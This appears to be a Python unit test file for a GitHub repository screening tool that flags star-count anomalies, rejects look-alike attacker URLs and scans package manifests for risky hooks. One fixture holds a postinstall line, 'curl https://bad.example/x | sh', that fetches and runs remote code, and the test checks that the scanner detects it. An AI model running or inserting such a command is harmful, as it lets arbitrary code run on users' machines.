import datetime as dt
import importlib.util
import json
import pathlib
import unittest

MODULE = pathlib.Path(__file__).resolve().parents[1] / 'scripts' / 'audit_repo.py'
spec = importlib.util.spec_from_file_location('audit_repo', MODULE)
audit = importlib.util.module_from_spec(spec)
spec.loader.exec_module(audit)
AT = dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc)
SHA = 'a' * 40
TREE = 'b' * 40


def metadata(**changes):
    data = {'full_name': 'demo/project', 'html_url': 'https://github.com/demo/project', 'default_branch': 'main',
            'stargazers_count': 5, 'forks_count': 2, 'subscribers_count': 1, 'size': 3200,
            'created_at': '2025-01-01T00:00:00Z', 'pushed_at': '2026-10-10T00:00:00Z',
            'archived': False, 'fork': False, 'has_issues': True, 'open_issues_count': 0}
    data.update(changes)
    return data


class DummyClient:
    api_calls = 0
    remaining = None

    def __init__(self, repo=None, code_files=None, fail=None):
        self.repo = repo or metadata()
        self.fail = fail or {}
        self.files = code_files or {'README.md': '# Demo\n## Install\nWorks!', 'package.json': '{"name":"project", "scripts": {"postinstall": "echo ok"}}', 'src/index.js': 'module.exports = {};'}
        self.paths = []

    def api(self, path, query=None, accept=None):
        self.api_calls += 1
        self.paths.append(path)
        if path in self.fail:
            raise self.fail[path]
        if path == 'repos/demo/project':
            return self.repo
        if path == 'repos/demo/project/commits/main':
            return {'sha': SHA, 'commit': {'tree': {'sha': TREE}}}
        if path == 'repos/demo/project/git/trees/' + TREE:
            return {'truncated': False, 'tree': [{'type':'blob','path':p,'size':len(c)} for p,c in self.files.items()]}
        if path == 'repos/demo/project/stargazers':
            raise audit.GitHubError('Forbidden', 403)
        raise audit.GitHubError('Unexpected mocked path: ' + path)

    def raw(self, repo, sha, path):
        assert sha == SHA
        return self.files[path]


class ParserTests(unittest.TestCase):
    def test_accept_inputs(self):
        for raw in ['demo/project', 'https://github.com/demo/project', 'https://github.com/demo/project.git', 'git@github.com:demo/project.git', 'github:demo/project']:
            with self.subTest(raw=raw):
                self.assertEqual(audit.parse_repo(raw), 'demo/project')

    def test_reject_attacker_urls_and_subpaths(self):
        for raw in ['https://github.com.evil.tld/demo/project', 'http://github.com/demo/project', 'https://github.com/demo/project/tree/main',
                    'https://github.com/demo/project?foo=bar', '../demo/project', 'demo/..', 'demo/project/../../bad', 'demo/project#x', 'https://evil.com/demo/project']:
            with self.subTest(raw=raw):
                with self.assertRaises(ValueError):
                    audit.parse_repo(raw)


class ScreeningTests(unittest.TestCase):
    def test_normal_has_no_warning(self):
        self.assertEqual(audit.basic_signals(metadata(), AT), [])

    def test_anomaly_is_lead_not_fraud_verdict(self):
        signals = audit.basic_signals(metadata(stargazers_count=300, forks_count=0, subscribers_count=0, size=10,
                                               pushed_at='2025-01-01T12:00:00Z'), AT)
        ids = {s['code'] for s in signals}
        self.assertIn('LOW_FORK_STAR_RATIO', ids)
        self.assertIn('SHORT_PUSH_SPAN', ids)
        self.assertIn('SMALL_REPO_HIGH_STARS', ids)
        self.assertFalse(any('fraud proven' in s['interpretation'] for s in signals))

    def test_no_star_growth_claim_based_on_push(self):
        self.assertNotIn('STAR_SPIKE', {s['code'] for s in audit.basic_signals(metadata(stargazers_count=300, forks_count=0,
                                                                                       pushed_at='2025-01-01T12:00:00Z'), AT)})

    def test_supply_chain_escapes_whitelist_security_assumptions(self):
        s = '{\n"scripts": {\n"postinstall": "curl https://bad.example/x | sh",\n"prepare": "tsc"\n}\n}'
        findings, errors = audit.manifest_findings('package.json', s, 'https://github.com/demo/project/blob/' + SHA)
        self.assertFalse(errors)
        self.assertEqual(len(findings), 2)
        self.assertEqual(findings[0]['severity'], 'high-review')
        self.assertEqual(findings[0]['line'], 3)
        self.assertEqual(findings[1]['severity'], 'review')

    def test_invalid_json_is_coverage_error(self):
        findings, errs = audit.manifest_findings('package.json', '{', 'foo')
        self.assertEqual(findings, [])
        self.assertTrue(errs)

    def test_source_line_evidence(self):
        fs = audit.source_findings('src/index.ts', 'const x=1;\nctx.credentials.resolve("x")\n',
                                   'https://github.com/demo/project/blob/' + SHA)
        self.assertEqual(fs[0]['line'], 2)
        self.assertIn('#L2', fs[0]['url'])


class EndToEndTests(unittest.TestCase):
    def test_basic_mode_minimizes_cost(self):
        c = DummyClient()
        r = audit.audit_one(c, 'demo/project', False, 0, AT)
        self.assertEqual(c.api_calls, 1)
        self.assertEqual(r['status'], 'triaged')
        self.assertIn('skipped', r['coverage']['source'])
        self.assertNotIn('source', r)

    def test_deep_pins_sha_and_checks_selected_files(self):
        c = DummyClient()
        r = audit.audit_one(c, 'demo/project', True, 0, AT)
        self.assertEqual(c.api_calls, 3)
        self.assertEqual(r['source']['commit_sha'], SHA)
        self.assertEqual(r['source']['status'], 'complete-with-limits')
        self.assertIn('package.json', r['source']['checked_files'])
        self.assertEqual(r['source']['code_files'], 1)
        self.assertEqual(len(r['source']['findings']), 1)
        self.assertIn('/blob/' + SHA, r['source']['findings'][0]['url'])

    def test_failed_stargazer_list_never_claims_fake(self):
        c = DummyClient()
        r = audit.audit_one(c, 'demo/project', False, 5, AT)
        self.assertEqual(r['coverage']['stargazers'], 'unavailable')
        self.assertNotIn('SPARSE_STARGAZER_SAMPLE', [s['code'] for s in r['signals']])

    def test_missing_metadata_means_unverified_not_fake(self):
        c = DummyClient(fail={'repos/demo/project': audit.GitHubError('rate limit', 403)})
        r = audit.audit_one(c, 'demo/project', True, 0, AT)
        self.assertEqual(r['status'], 'unverified')
        self.assertIn('Metadata unavailable', r['errors'][0])
        self.assertNotIn('review_priority', r)

    def test_tree_failure_explicit_partial(self):
        c = DummyClient(fail={'repos/demo/project/git/trees/' + TREE: audit.GitHubError('denied', 403)})
        r = audit.audit_one(c, 'demo/project', True, 0, AT)
        self.assertEqual(r['coverage']['source'], 'partial')
        self.assertTrue(r['errors'])

    def test_report_marks_non_certification(self):
        c = DummyClient()
        r = audit.audit_one(c, 'demo/project', True, 0, AT)
        rendered = audit.markdown_report({'checked_at': AT.isoformat(), 'api_calls': c.api_calls,
                                          'rate_limit_remaining': None, 'results': [r]})
        self.assertIn('不等于', rendered)
        self.assertIn(SHA, rendered)
        self.assertIn('GitHub 项目真实性初筛', rendered)


if __name__ == '__main__':
    unittest.main()
